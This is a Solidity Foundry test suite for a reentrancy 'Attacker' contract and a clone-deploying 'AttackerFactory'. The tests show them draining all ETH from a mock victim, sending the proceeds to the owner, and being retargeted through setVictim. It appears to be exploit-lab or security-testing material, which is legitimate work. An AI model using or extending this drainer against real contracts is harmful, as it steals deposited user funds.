// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {Attacker} from "../src/Attacker.sol";
import {AttackerFactory} from "../src/AttackerFactory.sol";
import {MockVictim} from "./mocks/MockVictim.sol";

contract AttackerTest is Test {
    MockVictim victim;
    Attacker attacker;
    address owner = address(this);

    function setUp() public {
        // Deploy victim and seed it with 2.5 ETH (simulates other users' deposits)
        victim = new MockVictim();
        vm.deal(address(victim), 2.5 ether);

        // Deploy attacker pointing at the victim
        attacker = new Attacker(address(victim));
    }

    // -----------------------------------------------------------------
    // Full drain: deposit 0.1 ETH, reenter until victim is empty
    // -----------------------------------------------------------------
    function test_fullDrain() public {
        uint256 victimBefore = address(victim).balance; // 2.5 ETH
        uint256 depositAmount = 0.1 ether;

        // Deposit into victim
        vm.deal(address(this), depositAmount);
        attacker.depositToVictim{value: depositAmount}();

        // Victim now holds 2.6 ETH (2.5 + 0.1)
        assertEq(address(victim).balance, victimBefore + depositAmount);

        // Exploit
        attacker.exploit(depositAmount);

        // Victim should be fully drained
        assertEq(address(victim).balance, 0);

        // Attacker contract holds all the ETH
        assertEq(address(attacker).balance, victimBefore + depositAmount);

        // Verify reentry count: each of the 26 withdrawals triggers receive(),
        // so reentryCount = 26 (the last one enters receive() but doesn't
        // re-enter withdraw because victim.balance < withdrawAmount).
        assertEq(attacker.reentryCount(), 26);

        console.log("Drained:", address(attacker).balance);
        console.log("Reentries:", attacker.reentryCount());
    }

    // -----------------------------------------------------------------
    // Partial drain: victim retains remainder below withdrawal amount
    // -----------------------------------------------------------------
    function test_partialDrain() public {
        // Deposit 0.3 ETH, withdraw in 0.3 ETH increments
        uint256 depositAmount = 0.3 ether;
        vm.deal(address(this), depositAmount);
        attacker.depositToVictim{value: depositAmount}();

        // Victim: 2.8 ETH.  floor(2.8 / 0.3) = 9 withdrawals = 2.7 ETH
        attacker.exploit(depositAmount);

        // Victim should have 0.1 ETH left (2.8 - 9*0.3 = 0.1)
        assertEq(address(victim).balance, 0.1 ether);
        assertEq(address(attacker).balance, 2.7 ether);
    }

    // -----------------------------------------------------------------
    // depositAndExploit convenience function
    // -----------------------------------------------------------------
    function test_depositAndExploit() public {
        uint256 depositAmount = 0.1 ether;
        vm.deal(address(this), depositAmount);

        attacker.depositAndExploit{value: depositAmount}();

        assertEq(address(victim).balance, 0);
        assertEq(address(attacker).balance, 2.6 ether);
    }

    // -----------------------------------------------------------------
    // Withdraw sends all ETH to the owner
    // -----------------------------------------------------------------
    function test_withdrawToOwner() public {
        uint256 depositAmount = 0.1 ether;
        vm.deal(address(this), depositAmount);
        attacker.depositAndExploit{value: depositAmount}();

        uint256 ownerBefore = address(owner).balance;
        attacker.withdraw();

        assertEq(address(attacker).balance, 0);
        assertEq(address(owner).balance, ownerBefore + 2.6 ether);
    }

    // -----------------------------------------------------------------
    // Access control: non-owner cannot exploit or withdraw
    // -----------------------------------------------------------------
    function test_onlyOwner_exploit() public {
        vm.prank(address(0xdead));
        vm.expectRevert(Attacker.NotOwner.selector);
        attacker.exploit(0.1 ether);
    }

    function test_onlyOwner_withdraw() public {
        vm.prank(address(0xdead));
        vm.expectRevert(Attacker.NotOwner.selector);
        attacker.withdraw();
    }

    function test_onlyOwner_deposit() public {
        vm.deal(address(0xdead), 1 ether);
        vm.prank(address(0xdead));
        vm.expectRevert(Attacker.NotOwner.selector);
        attacker.depositToVictim{value: 0.1 ether}();
    }

    // -----------------------------------------------------------------
    // setVictim allows reconfiguration
    // -----------------------------------------------------------------
    function test_setVictim() public {
        MockVictim newVictim = new MockVictim();
        attacker.setVictim(address(newVictim));
        assertEq(address(attacker.victim()), address(newVictim));
    }

    function test_setVictim_rejectsZero() public {
        vm.expectRevert(Attacker.InvalidAddress.selector);
        attacker.setVictim(address(0));
    }

    // -----------------------------------------------------------------
    // Events are emitted correctly
    // -----------------------------------------------------------------
    function test_eventEmission() public {
        uint256 depositAmount = 0.1 ether;
        vm.deal(address(this), depositAmount);

        vm.expectEmit(true, true, false, true);
        emit Attacker.Deposited(depositAmount, address(attacker));
        attacker.depositToVictim{value: depositAmount}();

        vm.expectEmit(false, false, false, true);
        emit Attacker.ExploitStarted(depositAmount, 2.6 ether);
        attacker.exploit(depositAmount);
    }

    // -----------------------------------------------------------------
    // Edge case: exploit with zero victim balance after deposit
    // -----------------------------------------------------------------
    function test_exploitEmptyVictim() public {
        // Drain victim balance first
        vm.deal(address(victim), 0);

        uint256 depositAmount = 0.1 ether;
        vm.deal(address(this), depositAmount);
        attacker.depositToVictim{value: depositAmount}();

        // Only the original deposit amount comes back (no extra to drain).
        // receive() still fires once (reentryCount = 1) but the balance
        // check prevents further reentry.
        attacker.exploit(depositAmount);
        assertEq(address(attacker).balance, depositAmount);
        assertEq(attacker.reentryCount(), 1);
    }

    // Allow this contract to receive ETH (for withdraw tests)
    receive() external payable {}
}

// =================================================================
// Factory tests — multi-contract relay attack
// =================================================================
contract AttackerFactoryTest is Test {
    MockVictim victim;
    AttackerFactory factory;

    function setUp() public {
        victim = new MockVictim();
        vm.deal(address(victim), 5 ether);

        factory = new AttackerFactory(address(victim));
    }

    function test_deployClones() public {
        factory.deployClones(3);
        assertEq(factory.cloneCount(), 3);
    }

    function test_multiCloneDrain() public {
        uint256 numClones = 5;
        uint256 depositPerClone = 0.1 ether;
        uint256 totalDeposit = depositPerClone * numClones;

        factory.deployClones(numClones);

        vm.deal(address(this), totalDeposit);
        factory.fundAndExploit{value: totalDeposit}(depositPerClone);

        // The first clone drains most/all of the victim.  Subsequent clones
        // deposit and then drain whatever remains (including their own deposit).
        // Net result: all ETH that was ever in the victim ends up across clones.
        // Victim balance should be 0 (5 ETH + 5*0.1 = 5.5 ETH total drained).
        assertEq(address(victim).balance, 0);

        // Collect from all clones
        factory.collectAll();

        // Total ETH across all clones = original 5 ETH + 0.5 ETH deposits
        assertEq(factory.getBalance(), 5.5 ether);

        // Withdraw to owner
        uint256 ownerBefore = address(this).balance;
        factory.withdraw();
        assertEq(address(this).balance, ownerBefore + 5.5 ether);
    }

    function test_onlyOwner_factory() public {
        vm.prank(address(0xdead));
        vm.expectRevert(AttackerFactory.NotOwner.selector);
        factory.deployClones(1);
    }

    receive() external payable {}
}
